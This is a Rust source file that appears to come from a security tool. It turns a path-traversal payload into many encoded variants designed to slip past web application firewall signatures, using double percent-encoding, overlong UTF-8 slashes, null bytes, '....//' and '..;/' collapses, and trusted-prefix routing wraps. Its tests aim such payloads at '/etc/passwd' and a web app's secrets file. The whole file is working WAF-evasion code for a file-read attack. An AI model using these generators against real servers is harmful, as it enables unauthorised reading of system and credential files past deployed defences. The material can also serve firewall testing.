//! Path-traversal payload-string equivalence + the joint
//! `(payload × delivery)` generator — the path arm of Phase B.
//!
//! Rewrites only the WAF-visible *encoding* of the traversal; the
//! operator's inferred target file is preserved verbatim (anti-rig:
//! never silently swap `secrets.php` for `/etc/passwd`). Every member
//! is re-verified ([`still_resolves`]) to still resolve, on a
//! permissive backend path resolver, to that exact target.

use super::{DeliveryShape, Dialect, EquivConfig, EquivPayload, Rng};

/// Loose percent-decode (single pass) + lowercase — the WAF/decoder
/// view. Handles `%2f`, `%2e`, `%5c`, `%00`, double-encoded one level.
fn pct_decode(s: &str) -> String {
    let b: Vec<char> = s.chars().collect();
    let mut o = String::with_capacity(b.len());
    let mut i = 0;
    while i < b.len() {
        if b[i] == '%' && i + 2 < b.len() && b[i + 1].is_ascii_hexdigit() && b[i + 2].is_ascii_hexdigit()
        {
            let h: String = b[i + 1..i + 3].iter().collect();
            if let Some(c) = u8::from_str_radix(&h, 16).ok().map(|x| x as char) {
                o.push(c.to_ascii_lowercase());
                i += 3;
                continue;
            }
        }
        o.push(b[i].to_ascii_lowercase());
        i += 1;
    }
    o
}

/// Normalised view: decode twice (defeat double-encoding), unify
/// back-slashes, drop NULs, collapse `....//`→`../`, squeeze slashes.
#[must_use]
pub fn normalize(s: &str) -> String {
    let mut t = pct_decode(&pct_decode(s));
    t = t.replace('\\', "/").replace('\u{0}', "");
    // `....//` and `..;/` → `../` (observed server collapses)
    while t.contains("....//") {
        t = t.replace("....//", "../");
    }
    t = t.replace("..;/", "../");
    while t.contains("//") {
        t = t.replace("//", "/");
    }
    t
}

/// The operator's intended target = the path tail with `..`/`.`
/// segments removed (e.g. `etc/passwd`, `var/www/secrets.php`).
fn target(payload: &str) -> String {
    let n = normalize(payload);
    let segs: Vec<&str> = n
        .split('/')
        .filter(|s| !s.is_empty() && *s != ".." && *s != ".")
        .collect();
    if segs.is_empty() {
        return n.trim_matches('/').to_string();
    }
    // Keep up to the last 4 meaningful segments (the file + a little
    // context) so the marker is specific but robust.
    let take = segs.len().min(4);
    segs[segs.len() - take..].join("/")
}

/// True iff `cand` still resolves to the operator's target AND still
/// carries a traversal/absolute mechanism (so it's still the attack).
#[must_use]
pub fn still_resolves(original: &str, cand: &str) -> bool {
    if cand.trim().is_empty() {
        return false;
    }
    let tgt = target(original);
    if tgt.len() < 3 {
        return false;
    }
    let nc = normalize(cand);
    if !nc.contains(&tgt) {
        return false; // target was changed/lost — anti-rig
    }
    // mechanism still present: a `..` traversal or an absolute path.
    let no = normalize(original);
    let had_dotdot = no.contains("..");
    if had_dotdot {
        cand.contains("..")
            || cand.to_ascii_lowercase().contains("%2e%2e")
            || cand.contains("....")
            || nc.contains("..")
    } else {
        nc.starts_with('/') || nc.contains(":/") || cand.starts_with('/')
    }
}

// ── encodings (resolver-transparent, WAF-opaque) ───────────────────
fn enc_slash(rng: &mut Rng) -> &'static str {
    *rng.pick(&["/", "%2f", "%252f", "%c0%af", "%5c", "/"])
}
fn enc_dot(rng: &mut Rng) -> &'static str {
    *rng.pick(&[".", "%2e", "%252e", "."])
}
fn enc_dotdot(rng: &mut Rng) -> String {
    match rng.below(7) {
        0 => "..".into(),
        1 => "%2e%2e".into(),
        2 => ".%2e".into(),
        3 => "%2e.".into(),
        4 => "....//".into(),
        5 => "..%00/".into(),
        _ => "..;/".into(),
    }
}

/// Re-encode every `/`, `.` and `..` of the payload with an
/// equivalent form (the backend resolver decodes/collapses them all
/// to the same path; the WAF signature differs).
fn rw_encode(s: &str, rng: &mut Rng) -> String {
    let mut out = String::with_capacity(s.len() * 2);
    let b: Vec<char> = s.chars().collect();
    let mut i = 0;
    while i < b.len() {
        if b[i] == '.' && i + 1 < b.len() && b[i + 1] == '.' {
            // a `..` segment (only when bounded by / or ends)
            let dd = enc_dotdot(rng);
            out.push_str(&dd);
            i += 2;
            // enc_dotdot variants ending in `/` already consumed the
            // following slash conceptually; skip a real one if present.
            if dd.ends_with('/') && i < b.len() && b[i] == '/' {
                i += 1;
            }
            continue;
        }
        if b[i] == '/' {
            out.push_str(enc_slash(rng));
            i += 1;
            continue;
        }
        if b[i] == '.' {
            out.push_str(enc_dot(rng));
            i += 1;
            continue;
        }
        out.push(b[i]);
        i += 1;
    }
    out
}

/// Orange-Tsai routing wrap: a fake-allowed prefix the WAF trusts,
/// then a traversal back to the real target.
fn rw_routing_wrap(s: &str, rng: &mut Rng) -> String {
    let pre = *rng.pick(&["/public/..", "/static/..", "/assets/..%2f..", "/admin;/.."]);
    let sep = *rng.pick(&["/", "%2f", "/"]);
    format!("{pre}{sep}{}", s.trim_start_matches('/'))
}

#[must_use]
pub fn generate(payload: &str, cfg: &EquivConfig) -> Vec<EquivPayload> {
    let mut rng = Rng::new(cfg.seed);
    let all = super::sql::delivery_set(&cfg.param);
    let (deliveries, single_forced) = match cfg.force_delivery {
        Some(i) if i < all.len() => (vec![all[i].clone()], true),
        _ => (all, false),
    };
    let mut seen: std::collections::HashSet<String> = std::collections::HashSet::new();
    let mut out: Vec<EquivPayload> = Vec::new();

    if !still_resolves(payload, payload) {
        return out;
    }

    for d in &deliveries {
        if !cfg.vary_delivery && !single_forced && !matches!(d, DeliveryShape::Query { .. }) {
            continue;
        }
        let key = format!("{}\u{1}{}", payload, d.label());
        if seen.insert(key) {
            out.push(EquivPayload {
                payload: payload.to_string(),
                delivery: d.clone(),
                dialect: Dialect::Generic,
                rules: vec!["identity"],
            });
        }
    }

    let mut attempts = 0;
    while out.len() < cfg.max && attempts < cfg.max * 24 + 64 {
        attempts += 1;
        let mut s = payload.to_string();
        let mut rules: Vec<&'static str> = Vec::new();
        if rng.chance(4, 5) {
            let n = rw_encode(&s, &mut rng);
            if n != s {
                s = n;
                rules.push("encode_lattice");
            }
        }
        if rng.chance(1, 3) {
            let n = rw_routing_wrap(&s, &mut rng);
            if n != s {
                s = n;
                rules.push("routing_wrap");
            }
        }
        if rules.is_empty() {
            continue;
        }
        if !still_resolves(payload, &s) {
            continue;
        }
        let d = if cfg.vary_delivery || single_forced {
            rng.pick(&deliveries).clone()
        } else {
            DeliveryShape::Query {
                param: cfg.param.clone(),
            }
        };
        let key = format!("{s}\u{1}{}", d.label());
        if !seen.insert(key) {
            continue;
        }
        out.push(EquivPayload {
            payload: s,
            delivery: d,
            dialect: Dialect::Generic,
            rules,
        });
    }
    super::enforce_transport_legal(&mut out);
    out.truncate(cfg.max);
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    fn cfg(seed: u64) -> EquivConfig {
        EquivConfig {
            seed,
            max: 48,
            verify: true,
            vary_delivery: true,
            param: "q".into(),
            force_delivery: None,
        }
    }

    #[test]
    fn target_is_preserved_never_swapped_to_passwd() {
        let atk = "../../../../var/www/html/config/secrets.php";
        let v = generate(atk, &cfg(3));
        assert!(!v.is_empty());
        for m in &v {
            assert!(still_resolves(atk, &m.payload), "unsound {:?}", m.payload);
            assert!(
                normalize(&m.payload).contains("secrets.php"),
                "target lost: {:?}",
                m.payload
            );
            assert!(
                !normalize(&m.payload).contains("etc/passwd"),
                "rewritten to passwd: {:?}",
                m.payload
            );
        }
    }

    #[test]
    fn encodings_decode_back_to_the_same_path() {
        assert_eq!(normalize("..%2f..%2fetc%2fpasswd"), "../../etc/passwd");
        assert_eq!(normalize("..%252f..%252fetc/passwd"), "../../etc/passwd");
        assert!(normalize("....//....//etc/passwd").ends_with("etc/passwd"));
        assert!(still_resolves(
            "../../../etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd"
        ));
    }

    #[test]
    fn classic_passwd_probe_is_preserved() {
        let v = generate("../../../etc/passwd", &cfg(1));
        assert!(!v.is_empty());
        for m in &v {
            assert!(normalize(&m.payload).contains("etc/passwd"));
        }
    }

    #[test]
    fn non_path_and_empty_emit_nothing() {
        assert!(generate("", &cfg(1)).is_empty());
        assert!(generate("hello", &cfg(1)).is_empty());
    }

    #[test]
    fn deterministic_and_diverse() {
        let a: Vec<_> = generate("../../../etc/passwd", &cfg(6))
            .into_iter()
            .map(|m| m.payload)
            .collect();
        let b: Vec<_> = generate("../../../etc/passwd", &cfg(6))
            .into_iter()
            .map(|m| m.payload)
            .collect();
        assert_eq!(a, b);
        let d: std::collections::HashSet<_> = a.iter().collect();
        assert!(d.len() >= 6, "too few distinct: {}", d.len());
    }
}
